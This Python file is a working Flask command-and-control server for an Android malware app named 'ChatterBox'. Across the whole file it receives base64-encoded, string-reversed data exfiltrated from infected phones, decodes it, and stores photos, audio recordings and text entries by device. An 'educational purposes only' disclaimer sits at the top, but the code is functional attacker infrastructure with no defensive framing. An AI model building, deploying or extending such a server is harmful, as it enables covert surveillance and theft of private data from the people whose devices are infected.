#!/usr/bin/env python3
"""
C2 Server for Android Malware
This is a simple Command and Control server for receiving
data exfiltrated from the ChatterBox malicious application.

For educational purposes only.
"""

import argparse
import base64
import json
import logging
import os
import time
from datetime import datetime
from flask import Flask, request, jsonify

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("c2_server.log"),
        logging.StreamHandler()
    ]
)

logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Create data directory if it doesn't exist
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "collected_data")
os.makedirs(DATA_DIR, exist_ok=True)

# Secret key for encryption (would match the one in the Android app)
SECRET_KEY = "c7f31783b7184d1892a5a30b24d28929"

def decrypt_data(encrypted_data):
    """
    Decrypt data received from the client
    This is a simplified version - in a real scenario, proper AES decryption would be used
    """
    try:
        # First level deobfuscation - base64 decode
        decoded_data = base64.b64decode(encrypted_data).decode('utf-8')
        
        # Second level deobfuscation - reverse the string (matches the app's obfuscation)
        reversed_data = decoded_data[::-1]
        
        return reversed_data
    except Exception as e:
        logger.error(f"Error decrypting data: {str(e)}")
        return None

@app.route('/api/collect', methods=['POST'])
def collect_data():
    """
    Endpoint to receive data from the Android app
    """
    try:
        # Log the request info
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')
        content_type = request.headers.get('Content-Type')
        
        logger.info(f"Received data from {client_ip} with User-Agent: {user_agent}")
        
        # Get raw data
        raw_data = request.get_data()
        if not raw_data:
            return jsonify({"status": "error", "message": "No data received"}), 400
        
        # Try to decrypt the data
        decrypted_data = decrypt_data(raw_data)
        if not decrypted_data:
            return jsonify({"status": "error", "message": "Failed to decrypt data"}), 400
        
        # Try to parse the data as JSON
        try:
            data = json.loads(decrypted_data)
            data_type = data.get('type', 'unknown')
            device_id = data.get('device_id', 'unknown')
            timestamp = data.get('timestamp', int(time.time() * 1000))
        except json.JSONDecodeError:
            # If not JSON, assume it's raw text
            data_type = "raw"
            device_id = "unknown"
            timestamp = int(time.time() * 1000)
            data = {"raw_data": decrypted_data}
        
        # Create directory for this device if it doesn't exist
        device_dir = os.path.join(DATA_DIR, device_id)
        os.makedirs(device_dir, exist_ok=True)
        
        # Create a filename based on the data type and timestamp
        date_str = datetime.fromtimestamp(timestamp / 1000).strftime('%Y%m%d_%H%M%S')
        filename = f"{date_str}_{data_type}.json"
        file_path = os.path.join(device_dir, filename)
        
        # Save the data to a file
        with open(file_path, 'w') as f:
            json.dump(data, f, indent=2)
        
        logger.info(f"Saved {data_type} data from {device_id} to {file_path}")
        
        return jsonify({"status": "success", "message": "Data received and processed"}), 200
    
    except Exception as e:
        logger.error(f"Error processing data: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/upload', methods=['POST'])
def upload_file():
    """
    Alternate endpoint for receiving multipart/form-data
    This is used for file uploads (images, audio recordings)
    """
    try:
        # Log the request info
        client_ip = request.remote_addr
        logger.info(f"Received file upload from {client_ip}")
        
        # Check if 'data' field exists in the form
        if 'data' not in request.files:
            return jsonify({"status": "error", "message": "No file part"}), 400
        
        file = request.files['data']
        if file.filename == '':
            return jsonify({"status": "error", "message": "No selected file"}), 400
        
        # Determine file type based on extension
        filename = file.filename
        file_extension = os.path.splitext(filename)[1].lower()
        data_type = "data"
        
        if file_extension in ['.jpg', '.jpeg', '.png']:
            data_type = "photo"
        elif file_extension in ['.3gp', '.mp3', '.wav']:
            data_type = "audio"
        elif file_extension in ['.txt']:
            # Process text file containing collected data
            try:
                content = file.read().decode('utf-8')
                decrypted_data = decrypt_data(content)
                if decrypted_data:
                    # Save each line as a separate data entry
                    for line in decrypted_data.strip().split('\n'):
                        parts = line.split(':', 2)
                        if len(parts) >= 3:
                            timestamp, entry_type, entry_data = parts
                            # Save entry
                            entry_dir = os.path.join(DATA_DIR, "unknown", entry_type)
                            os.makedirs(entry_dir, exist_ok=True)
                            entry_file = os.path.join(entry_dir, f"{timestamp}.txt")
                            with open(entry_file, 'w') as f:
                                f.write(entry_data)
                            logger.info(f"Saved {entry_type} data to {entry_file}")
            except Exception as e:
                logger.error(f"Error processing text file: {str(e)}")
            
            return jsonify({"status": "success", "message": "Text data processed"}), 200
        
        # Save the file
        device_id = "unknown"
        device_dir = os.path.join(DATA_DIR, device_id, data_type)
        os.makedirs(device_dir, exist_ok=True)
        
        date_str = datetime.now().strftime('%Y%m%d_%H%M%S')
        new_filename = f"{date_str}_{filename}"
        file_path = os.path.join(device_dir, new_filename)
        
        file.seek(0)
        file.save(file_path)
        
        logger.info(f"Saved {data_type} file to {file_path}")
        
        return jsonify({"status": "success", "message": "File received and saved"}), 200
    
    except Exception as e:
        logger.error(f"Error processing file upload: {str(e)}")
        return jsonify({"status": "error", "message": str(e)}), 500

def main():
    parser = argparse.ArgumentParser(description='C2 Server for Android Malware')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind')
    parser.add_argument('--port', type=int, default=8080, help='Port to bind')
    parser.add_argument('--debug', action='store_true', help='Enable debug mode')
    args = parser.parse_args()
    
    logger.info(f"Starting C2 server on {args.host}:{args.port}")
    app.run(host=args.host, port=args.port, debug=args.debug)

if __name__ == '__main__':
    main()
